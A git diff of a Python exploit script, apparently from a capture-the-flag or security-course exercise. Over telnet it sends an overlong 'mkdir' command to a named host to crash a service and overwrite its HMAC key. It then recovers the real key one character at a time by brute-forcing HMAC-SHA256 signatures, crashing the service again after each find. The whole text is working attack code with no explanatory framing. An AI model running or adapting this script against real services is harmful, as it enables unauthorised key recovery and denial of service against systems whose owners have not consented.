@@ -1,3 +1,4 @@
+from inspect import signature
 import telnetlib
 import hmac
 import hashlib
@@ -7,31 +8,17 @@ import os
 from dotenv import load_dotenv
 load_dotenv()
 
-command = r"mkdir\ aaaaaaaaaaaaaaaaaaaaaaaa"
-overwrittenkey = ["a","a","a","a","a","a","a","a","a","a","a","a","a","a","a","a","a","a","b","c"]
+command = r"mkdir\ aaaaaaaaaaaaaaaaaaaaaaaab"
+overwrittenkey = ["a","a","a","a","a","a","a","a","a","a","a","a","a","a","a","a","a","a","a","a"]
 user = rf"{os.getenv('INFO_USER')}"
 port =int(os.getenv('INFO_PORT'))
 print(f"USER: {user} PORT: {port}")
+crash = fr"{user};mkdir\ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;{overwrittenkey} \n"
 realkey = []
-tn = telnetlib.Telnet()
-
-
-print("Checking that works")
-tn.open("device1.vikaa.fi",port)
-testcommand = fr"{command}{''.join(overwrittenkey)}"
-message = fr"ClientCmd|{user}|{testcommand}"
-hash = hmac.new(''.join(overwrittenkey).encode("utf8"), message.encode("utf8"), hashlib.sha256).hexdigest()
-test = f"{user};{testcommand};{hash}\n"
-tn.write(test.encode("utf8"))
-print(tn.read_all().decode())
-tn.close()
-
 if input("Require input from user to proceed between steps (y/n): ") == "y":
   usenext = True
 else: 
   usenext = False
-
-# Process CharSet
 chars = [*string.printable]
 chars.pop()
 chars.pop()
@@ -40,26 +27,29 @@ chars.pop()
 chars.pop()
 for i in range(161,255):
   chars.append(chr(i))
+print(chars.pop(107))
+print(chars, "\n\n")
+print(user)
 # chars = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","å","ä","ö","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","Å","Ä","Ö","1","2","3","4","5","6","7","8","9","0"," ","!","?",".",",","*","_","-","€","#","@","/","(",")",]
 
-# Function that crashes service
+
+# guess = rf"aaaaaaaaaaaaaaaaaaaa"
+# message = rf"ClientCmd|{user}|{command}{''.join(overwrittenkey)}"
+# print(guess)
+# hash = hmac.new(guess.encode("ascii"), message.encode("ascii"), hashlib.sha256)
+# signature = hash.hexdigest()
+# print(signature)
+
 def crashservice():
-  crash = fr"{user};mkdir\ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;{overwrittenkey} \n"
   tn.open("device1.vikaa.fi",port)
   tn.write(crash.encode("utf8"))
   time.sleep(10)
-crashservice()
 
 while overwrittenkey:
-
-  # Pop first last key
   overwrittenkey.pop()
   print("Real key ", realkey)
   print("Overwritten key: ", ''.join(overwrittenkey), ". Overridden characters: ", len(overwrittenkey), "\n")
-
-  # Is the answer found
   found = False
-
   newcommand = fr"{command}{''.join(overwrittenkey)}"
   print("New command is", newcommand,"With lenght", len(newcommand))
   for char in chars:
@@ -82,8 +72,7 @@ while overwrittenkey:
         found = True
         realkey.insert(0,char)
         print("Found character: ", char, " Real key is now: ", realkey, " Crashing service")
-      
-      crashservice()
+        crashservice()
       
   if usenext:
     next = input("Search next ? \n")
